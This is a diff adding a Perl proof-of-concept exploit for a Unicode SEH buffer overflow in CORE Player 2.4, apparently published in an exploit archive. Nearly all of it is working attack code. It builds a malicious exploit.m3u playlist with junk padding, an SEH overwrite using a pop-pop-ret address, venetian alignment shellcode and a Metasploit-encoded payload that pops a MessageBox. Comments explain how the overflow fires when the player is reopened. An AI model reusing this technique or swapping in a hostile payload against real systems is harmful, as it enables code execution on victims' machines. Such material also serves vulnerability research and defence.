@@ -1,0 +1,75 @@
+# Exploit: CORE Multimedia Suite 2011 CORE Player 2.4 Unicode SEH Buffer Overflow Exploit (.m3u)
+# Date: 18.03.11
+# Author: Rh0[at]z1p.biz
+# Software Link: http://mjm-soft.zzl.org/CORE_MMS_2011.zip
+# Version: 2.4
+# Tested on: WinXP Pro SP3 EN (VirtualBox)
+
+## The application does not crash immediately:
+## Open Core Player, go to FILE->LOAD LIST, load the playlist and
+## close the program. ==> Reopening it triggers the buffer overflow. <==
+## Seems that the playlist gets saved under Load.m3l in the
+## programs directory, and everytime the player is opened, the malicious
+## playlist triggers the overflow.
+## To be able to start the player normally, remove the Load.m3l file
+
+print " [*] Core Player 2.4 Unicode SEH Buffer Overflow Exploit [*] \n\n";
+
+$junk = "C:\\";
+$junk .= "A" x 533;		# 536 bytes until nseh overwrite
+$nseh = "\x90\xcf"; 	# becomes nop; add bh,cl (pad)
+$seh = "\x59\x4a";		# pop;pop;ret; unicode compatible, 0x004a0059 @ core player.exe
+
+## venetian shellcode 
+$vSC = 
+"\x71".			#
+"\x58".			# pop eax (eax should then be 0x0012CC14)
+"\x71".
+"\x5d".			# pop ebp
+"\x71".
+"\xbb\x08\x41". # mov ebx,0x41000800
+"\xf8".			# add al,bh
+"\x71".		
+"\xbb\x04\x41". # mov ebx,0x41000400
+"\xfc".			# add ah,bh		(eax should now point to the payload)
+"\x71".
+"\x50".			# push eax
+"\x71".
+"\xc3";			# return
+
+## msf MessageBox alpha_mixed + unicode upper
+$payload =
+"PPYAIAIAIAIAQATAXAZAPU3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAI".
+"AXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBTIK0IKXNXYT".
+"0L4QJPJPJPJPJPJPJPJPJPJPJPJQ3PCPCPCPCQ3P7PRQIQZQ1PXR0P0Q1P0Q1RKQ1Q1PQP".
+"2Q1PBP2Q2PBP0PBPBQ1Q2PXR0P8Q1Q2CEPJQ9PXPYPXRKPMPKPNP9QBPTQ5CDQ9RDR4RQP".
+"ZRRPOQ2PCPGPEC1PKT9R2Q4PLPKPQQQPPP0PLPKQ3Q6QDPLPLPKR1C6PGRLPLPKPRQVPVQ".
+"XPNRKPCPNPQP0PNRKPVPVQ5QXPPPOQ7C8R2PUPXCCR1Q9PEPQQHR1PKPOQHC1PCR0PNRKR".
+"0RLR1P4PGQDPLPKQ3T5Q7PLPLPKPVP4PQP8PRPXPCP1QHQZPNRKPQPZPTQHPLPKQ3QZPGP".
+"PPCP1PZPKPKQCQ7Q4PQPYPLPKPGQ4PLPKPGT1PZPNQ5C1PIROQFR1PKRPPKPLPNPLPOCDQ".
+"9R0R2QDQ3P7Q9PQQJROPTPMR6QQPOP7PZPKQJPTQ7PKPCPLQ7R4Q7QHQ3Q5PIT1PNRKR0Q".
+"JPVQ4QFQQQJPKPCQFPLPKPVRLPPPKPLPKPQPJQ7RLPGT1PZPKPNRKQFQTPNRKR6QQQJPHP".
+"KP9R2QTQ7R4PGRLPCR1POP3POQ2R4PHPVQ9PNP4PORYQHQUPLPIPIPRQ5P8PNRNR0PNR4P".
+"NPXRLR0PRPMP8PMPOQ9ROPKPOQ9ROPOCIPCCEQFC4PMRKQ3PNQHR8QJPBR2QCPKP7Q5PLR".
+"6Q4QFP2PZQ8PLPNPIROQ9ROPIROPOCIPQR5Q7T8Q5P8PPRLPPRLQ5RPPRQQPQCHR0P3R0P".
+"2R4RNPEP4Q5P8R4P5PCQ3R2PER0T2PLQ8R1PLPGQDQ5QJPNQYPXQVPRCFPKPOQFP5Q7CDP".
+"KP9PKCBQFP0POPKPNPHQ9P2PPPMPMRLPKP7PEPLPGPTPQQ2PICHQ5P1PKPOPKPOPKPOPQT".
+"8Q5P4PRCHPERPPQP0Q3PXPPROQ5P9QDP4PEP5PEP8PRQUPPT8R0T0QBPLPPP1Q9PKPLQ8P".
+"CRLR1P4PVC9PMQIQHRCR1RXR1PHPERPPET0PQP0R2Q8Q3PYR2QDPET0Q5RZPPC8R0T8R0R".
+"PPRPLPPROR0RHPQT4R0C5PERPPPQ5R1RXPRPNR2PIPRC3PPROQBPHQBQUQ3T8R1P0PPPUP".
+"EP8Q3QEQDP2Q5RPQFP3PCR8R2RPPRPLPEP1R0RYR2PHPPROQ3Q2QBQ5PERPR1CHPGPPPEC".
+"JR1P0R0Q3PPP1PIR9PNC8R0PLQFPDPET4PKP9PMP1QDRQPNP2QBPJPCRPQBRSPRT1R6P2Q".
+"9ROPNP0QFR1POP0R6P0PKPOQ3C5Q7CHQ1Q1AA";
+
+open(F,">exploit.m3u");
+$buffer .= $junk.$nseh.$seh.$vSC.$payload;
+print F $buffer;
+close(F);
+
+print " [*] Open Core Player\n";
+print " [*] Load the playlist exploit.m3u \n"; 
+print " [*] Close the program\n";
+print " [*] Reopen it\n";
+print " [*] A Messagebox should pop up.\n\n";
+print " [*] Enter to continue [*] ";
+<>;
